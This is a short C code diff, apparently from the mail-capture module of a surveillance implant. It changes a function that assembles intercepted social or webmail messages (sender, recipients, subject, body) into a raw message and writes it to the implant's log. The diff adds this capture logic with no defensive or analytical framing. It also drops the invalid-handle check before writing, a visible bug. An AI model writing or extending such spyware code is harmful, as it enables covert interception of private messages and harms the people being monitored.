@@ -52,10 +52,18 @@ void urldecode(char *src)
 void LogSocialMailMessage(DWORD program, char *from, char *rcpt, char *cc, char *subject, char *body, BOOL is_incoming)
 {
 	HANDLE hf;
+	char *raw_mail;
+	DWORD field_len;
 	struct MailSerializedMessageHeader additional_header;
 	
+	field_len = strlen(from) + strlen(rcpt) + strlen(cc) + strlen(subject) + strlen(body) + 256;
+	raw_mail = (char *)malloc(field_len);
+	if (!raw_mail)
+		return;
+	_snprintf_s(raw_mail, field_len, _TRUNCATE, "From: %s\r\nTo: %s\r\nCC: %s\r\nSubject: %s\r\nContent-Type: text/html\r\n\r\n%s", from, rcpt, cc, subject, body);
+
 	ZeroMemory(&additional_header, sizeof(additional_header));
-	//additional_header.Size = mail_size;
+	additional_header.Size = strlen(raw_mail);
 	additional_header.Flags |= MAIL_FULL_BODY;
 	if (is_incoming)
 		additional_header.Flags |= MAIL_INCOMING;
@@ -63,16 +71,16 @@ void LogSocialMailMessage(DWORD program, char *from, char *rcpt, char *cc, char 
 		additional_header.Flags |= MAIL_OUTGOING;
 	additional_header.Program = program;
 	additional_header.VersionFlags = MAPI_V3_0_PROTO;
+
+	// XXX Devo settare la data
 	//additional_header.date.dwHighDateTime = mail_date->dwHighDateTime;
 	//additional_header.date.dwLowDateTime = mail_date->dwLowDateTime;
 
 	hf = Log_CreateFile(PM_MAILAGENT, (BYTE *)&additional_header, sizeof(additional_header));
-	if (hf == INVALID_HANDLE_VALUE)
-		return;
-
-	//Log_WriteFile(hf, body, size);
-
+	Log_WriteFile(hf, (BYTE *)raw_mail, additional_header.Size);
 	Log_CloseFile(hf); 
+
+	SAFE_FREE(raw_mail);
 	return;
 }
 
